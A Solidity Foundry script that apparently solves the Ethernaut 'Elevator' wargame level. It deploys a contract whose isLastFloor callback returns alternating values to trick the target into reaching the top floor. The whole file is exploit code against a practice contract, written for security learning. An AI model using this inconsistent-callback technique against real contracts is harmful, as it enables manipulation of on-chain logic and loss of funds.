// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import { Script } from "forge-std/Script.sol";
import { EthernautScript } from "src/common/EthernautScript.sol";
import { Building, Elevator } from "./Problem.sol";

contract Solution is Building {
  bool public _isLastFloor;

  function isLastFloor(uint) external override returns(bool){
      bool returnValue = _isLastFloor;
      _isLastFloor = !_isLastFloor;
      return returnValue;
  }

  function goToTheLastFloor(Elevator _elevator) external {
      _elevator.goTo(1);
  }
}

contract SolutionScript is EthernautScript {

    function solve(address payable _instanceAddress) internal override {

        Elevator elevator = Elevator(_instanceAddress);
        assert(!elevator.top());

        vm.startBroadcast();
        Solution solution = new Solution();
        solution.goToTheLastFloor(elevator);
        vm.stopBroadcast();

        assert(elevator.top());

    }

    function getLevelAddress() internal view override returns(address) {
        return 0xaB4F3F2644060b2D960b0d88F0a42d1D27484687;
    }

    function getCreationValue() internal view override returns(uint256) {
        return 0.001 ether;
    }
}

